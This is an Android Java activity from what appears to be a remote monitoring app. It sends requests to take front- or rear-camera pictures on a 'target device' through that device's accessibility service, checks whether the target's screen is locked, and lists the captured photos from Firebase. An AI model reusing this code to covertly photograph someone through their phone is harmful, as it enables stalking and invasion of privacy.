package com.reiserx.myapplication24.Activities.Camera;

import android.annotation.SuppressLint;
import android.app.ProgressDialog;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.RadioButton;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.Query;
import com.google.firebase.firestore.QueryDocumentSnapshot;
import com.google.firebase.firestore.QuerySnapshot;
import com.reiserx.myapplication24.Adapters.Camera.CameraAdapter;
import com.reiserx.myapplication24.Advertisements.InterstitialAdsClass;
import com.reiserx.myapplication24.Advertisements.bannerAdsClass;
import com.reiserx.myapplication24.Classes.SnackbarTop;
import com.reiserx.myapplication24.Models.TaskSuccess;
import com.reiserx.myapplication24.Models.deviceInfo;
import com.reiserx.myapplication24.Models.downloadUrl;
import com.reiserx.myapplication24.Models.performTask;
import com.reiserx.myapplication24.R;
import com.reiserx.myapplication24.databinding.ActivityCameraBinding;

import java.util.ArrayList;
import java.util.Objects;

public class CameraActivity extends AppCompatActivity {

    ActivityCameraBinding binding;

    ArrayList<downloadUrl> data;
    CameraAdapter adapter;

    String UserID;

    FirebaseFirestore firestore;

    int pastVisiblesItems, totalItemCount, first_visible_item;
    boolean scrolling = false;
    LinearLayoutManager layoutManager;
    Query first;

    String TAG = "thhgshgshfs";

    QuerySnapshot check;

    String requestCode;

    ValueEventListener valueEventListener;
    DatabaseReference reference;

    SnackbarTop snackbarTop;

    ProgressDialog prog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityCameraBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        UserID = getIntent().getStringExtra("UserID");

        firestore = FirebaseFirestore.getInstance();

        binding.rec.setVisibility(View.GONE);
        binding.progHolder.setVisibility(View.VISIBLE);
        binding.progressBar2.setVisibility(View.VISIBLE);
        binding.textView9.setVisibility(View.GONE);

        bannerAdsClass bannerAdsClass = new bannerAdsClass(this, binding.bannerAdHolder);
        bannerAdsClass.adsCode();

        snackbarTop = new SnackbarTop(findViewById(android.R.id.content));

        setTitle("Pictures");

        data = new ArrayList<>();
        layoutManager = new LinearLayoutManager(this);
        binding.rec.setLayoutManager(layoutManager);
        adapter = new CameraAdapter(this, data, UserID, findViewById(android.R.id.content));
        binding.rec.setAdapter(adapter);
        refresh();

        binding.floatingActionButton2.setOnClickListener(view -> takePicture());
    }

    @SuppressLint({"NotifyDataSetChanged", "SetTextI18n"})
    public void refresh () {

        Query query = firestore.collection("Main").document(UserID).collection("CameraPicture")
                .orderBy("timeStamp", Query.Direction.DESCENDING).limit(30);
        query.addSnapshotListener((task, error) -> {
            if (task != null) {
                data.clear();
                for (DocumentSnapshot document : Objects.requireNonNull(task.getDocuments())) {
                    downloadUrl cn = document.toObject(downloadUrl.class);
                    if (cn != null) {
                        cn.setId(document.getId());
                        data.add(cn);
                    }
                }
                if (!data.isEmpty()) {
                    binding.rec.setVisibility(View.VISIBLE);
                    binding.progHolder.setVisibility(View.GONE);
                    adapter.notifyDataSetChanged();
                    setTitle("Pictures ".concat(String.valueOf(data.size())));
                    adapter.notifyDataSetChanged();
                    check = task;
                    scrolls(task.getDocuments()
                            .get(task.size() - 1));
                } else {
                    binding.textView9.setText("No data available");
                    binding.rec.setVisibility(View.GONE);
                    binding.progHolder.setVisibility(View.VISIBLE);
                    binding.progressBar2.setVisibility(View.GONE);
                    binding.textView9.setVisibility(View.VISIBLE);
                }
            } else {
                binding.textView9.setText(String.valueOf(error));
                binding.rec.setVisibility(View.GONE);
                binding.progHolder.setVisibility(View.VISIBLE);
                binding.progressBar2.setVisibility(View.GONE);
                binding.textView9.setVisibility(View.VISIBLE);
            }
        });
    }

    public void scrolls(DocumentSnapshot lastVisibles) {
        binding.rec.addOnScrollListener(new RecyclerView.OnScrollListener() {
            @Override
            public void onScrolled(@NonNull RecyclerView recyclerView, int dx, int dy) {
                super.onScrolled(recyclerView, dx, dy);

                if (dy > 0) { //check for scroll down
                    first_visible_item = layoutManager.findFirstVisibleItemPosition();
                    totalItemCount = layoutManager.getItemCount();
                    pastVisiblesItems = layoutManager.findLastVisibleItemPosition();

                    if ((first_visible_item + pastVisiblesItems) >= totalItemCount) {
                        if (!scrolling) {
                            scrolling = true;
                            if (check != null) {
                                if (check.size()-1 < 9) {
                                    Toast.makeText(CameraActivity.this, "loaded all", Toast.LENGTH_SHORT).show();
                                } else {
                                    ref(10, lastVisibles);
                                    Log.d(TAG, "load");
                                }
                            } else Log.d(TAG, "jidsnf");
                        } else Log.d(TAG, "not scrolling");
                    } else {
                        Log.d(TAG, "total: "+totalItemCount);
                        Log.d(TAG, "first: "+first_visible_item);
                        Log.d(TAG, "last: "+pastVisiblesItems);
                    }
                }
            }
        });
    }

    @SuppressLint({"NotifyDataSetChanged", "SetTextI18n"})
    public void ref(int limit, DocumentSnapshot lastVisible) {
        Log.d(TAG, "loading");
        if (lastVisible != null) {
            first = firestore.collection("Main").document(UserID).collection("CameraPicture")
                    .orderBy("timeStamp", Query.Direction.DESCENDING).startAfter(lastVisible).limit(limit);
        } else {
            first = firestore.collection("Main").document(UserID).collection("CameraPicture")
                    .orderBy("timeStamp", Query.Direction.DESCENDING).limit(limit);
        }

        first.get().addOnSuccessListener((value) -> {
            if (value != null && !value.isEmpty()) {
                for (DocumentSnapshot document : Objects.requireNonNull(value.getDocuments())) {
                    downloadUrl cn = document.toObject(downloadUrl.class);
                    if (cn != null) {
                        cn.setId(document.getId());
                    }
                    data.add(cn);
                }
                if (!data.isEmpty()) {
                    binding.rec.setVisibility(View.VISIBLE);
                    binding.progHolder.setVisibility(View.GONE);
                    adapter.notifyDataSetChanged();
                    setTitle("Pictures ".concat(String.valueOf(data.size())));
                } else {
                    binding.textView9.setText("No data available");
                    binding.rec.setVisibility(View.GONE);
                    binding.progHolder.setVisibility(View.VISIBLE);
                    binding.progressBar2.setVisibility(View.GONE);
                    binding.textView9.setVisibility(View.VISIBLE);
                }
                adapter.notifyDataSetChanged();
                scrolls(value.getDocuments()
                        .get(value.size() - 1));
                scrolling = false;
            } else {
                SnackbarTop snackbarTop = new SnackbarTop(findViewById(android.R.id.content));
                snackbarTop.showSnackBar("Loaded all data", true);
            }
        });
    }
    @SuppressLint("NonConstantResourceId")
    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        if (item.getItemId() == R.id.camera_menuitem_option) {
            AlertDialog.Builder alert = new AlertDialog.Builder(this);
            alert.setTitle("Info");
            alert.setMessage("This will take a picture from target device using camera\n\nAccessibility service needs to be running for using hardware camera, you can check its status in operations activity");
            alert.setPositiveButton("ok", null);
            alert.show();
        }
        return super.onOptionsItemSelected(item);
    }
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.camera_options_menu, menu);
        return super.onCreateOptionsMenu(menu);
    }

    private void process() {

        prog = new ProgressDialog(this);
        prog.setMessage("Processing...");
        prog.setCancelable(false);
        prog.show();

        FirebaseFirestore firestore = FirebaseFirestore.getInstance();
        CollectionReference document = firestore.collection("Main").document(UserID).collection("DeviceInfo");
        document.get().addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                for (QueryDocumentSnapshot document1 : task.getResult()) {
                    deviceInfo d = document1.toObject(deviceInfo.class);
                    if (d.getSdk() >= 30) {
                        prog.setMessage("Sending request");
                        performTask performTask = new performTask(requestCode, 20, UserID);
                        performTask.Task();
                        snackbarTop.showSnackBar("Just wait a moment", true);
                        listeners();
                        prog.dismiss();
                        InterstitialAdsClass interstitialAdsClass = new InterstitialAdsClass(this);
                        interstitialAdsClass.loadAds();
                        Log.d(TAG, "30");
                    } else {
                        checkLock();
                    }
                }
            } else {
                prog.dismiss();
                Toast.makeText(this, String.valueOf(task.getException()), Toast.LENGTH_SHORT).show();
                Log.d(TAG, "Error getting documents: ", task.getException());
            }
        });
    }

    private void checkLock() {

        prog.setMessage("Checking device lock");
        DatabaseReference scrnLock = FirebaseDatabase.getInstance().getReference("Main").child(UserID).child("ServiceStatus").child("screenLock");
        scrnLock.addListenerForSingleValueEvent(new ValueEventListener() {
            @SuppressLint("SetTextI18n")
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    boolean value = snapshot.getValue(Boolean.class);
                    if (value) {
                        snackbarTop.showSnackBar("Can't capture, target device is locked", false);
                    } else {
                        prog.setMessage("Sending request");
                        performTask performTask = new performTask(requestCode, 20, UserID);
                        performTask.Task();
                        snackbarTop.showSnackBar("Just wait a moment", true);
                        InterstitialAdsClass interstitialAdsClass = new InterstitialAdsClass(CameraActivity.this);
                        interstitialAdsClass.loadAds();
                        listeners();
                        Log.d(TAG, "-30");
                    }
                    prog.dismiss();
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
    }

    private void listeners () {
        reference = FirebaseDatabase.getInstance().getReference().child("Main").child(UserID).child("CameraCapture");
        valueEventListener = reference.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    TaskSuccess data = snapshot.getValue(TaskSuccess.class);
                    if (data != null) {
                        snackbarTop.showSnackBar(data.getMessage(), data.isSuccess());
                        if (data.isFinal()) {
                            reference.removeValue();
                            if (valueEventListener != null) {
                                reference.removeEventListener(valueEventListener);
                            }
                        }
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
    }

    public void takePicture() {

        SnackbarTop snackbarTop = new SnackbarTop(findViewById(android.R.id.content));

        AlertDialog.Builder alert = new AlertDialog.Builder(this);

        View mView = getLayoutInflater().inflate(R.layout.radio_2button_dialog, null);
        final RadioButton front = mView.findViewById(R.id.radioBtn1);
        final RadioButton back = mView.findViewById(R.id.radioBtns2);

        alert.setTitle("Camera capture");
        alert.setMessage("Please select camera facing");
        alert.setView(mView);

        front.setText("Front facing");
        front.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (front.isChecked()) {
                requestCode = "front";
                back.setChecked(false);
            }
        });

        back.setText("Rear facing");
        back.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (back.isChecked()) {
                requestCode = "back";
                front.setChecked(false);
            }
        });

        alert.setPositiveButton("save", (dialog, whichButton) -> {
            if (requestCode.trim().equals("")) {
                snackbarTop.showSnackBar("Please select camera facing", false);
            } else {
                process();
            }
        });

        alert.setNegativeButton("cancel", null);

        alert.show();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (valueEventListener != null) {
            reference.removeEventListener(valueEventListener);
        }
    }
}